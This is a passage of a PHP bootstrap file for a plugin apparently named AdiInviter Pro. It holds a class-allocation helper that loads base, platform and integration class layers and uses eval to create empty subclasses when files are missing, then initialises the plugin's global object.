	$obj->adi =& $adiinviter;
	return $obj;
}


function adi_allocate($resource_name)
{
	if(class_exists($resource_name))
	{
		return new $resource_name();
	}
	else
	{
		// Check Base layer Class
		if(!class_exists($resource_name.'_Base')) // check if default-base exists.
		{
			adi_throwErrorDesc('fn.allocate : Failed to allocate resource : '.$resource_name);
			return false;
		}

		// Load Platform layer class
		if(!class_exists($resource_name.'_Platform'))
		{
			$platform_file = ADI_PLATFORM_PATH . $resource_name . '.php';
			if(file_exists($platform_file)) {
				require_once($platform_file);
			}
			if(!class_exists($resource_name.'_Platform'))
			{
				eval("class ".$resource_name."_Platform extends ".$resource_name."_Base\n { }");
			}
		}

		// Load integration layer class
		if(!class_exists($resource_name))
		{
			$integration_file = ADI_LIB_PATH.'integration'.ADI_DS.$resource_name.'.php';
			if(file_exists($integration_file))
			{
				require_once($integration_file);
			}
			if(!class_exists($resource_name))
			{
				eval("class ".$resource_name." extends ".$resource_name."_Platform\n { }");
			}
		}
		return new $resource_name();
	}
}

function adi_call_event($id, $data = null)
{
	global $adiinviter;
	return $adiinviter->notifier->call_event($id, $data);
}

// Load Important functions
include_once(ADI_LIB_PATH . 'functions.php');

$adiinviter = adi_allocate('AdiInviterPro');
$GLOBALS['adiinviter'] =& $adiinviter;
$adiinviter->init();

$adiinviter_not_installed_message = 'AdiInviter Pro is not installed yet.';

define('ADI_TIME_NOW', $adiinviter->adi_get_utc_timestamp());

?>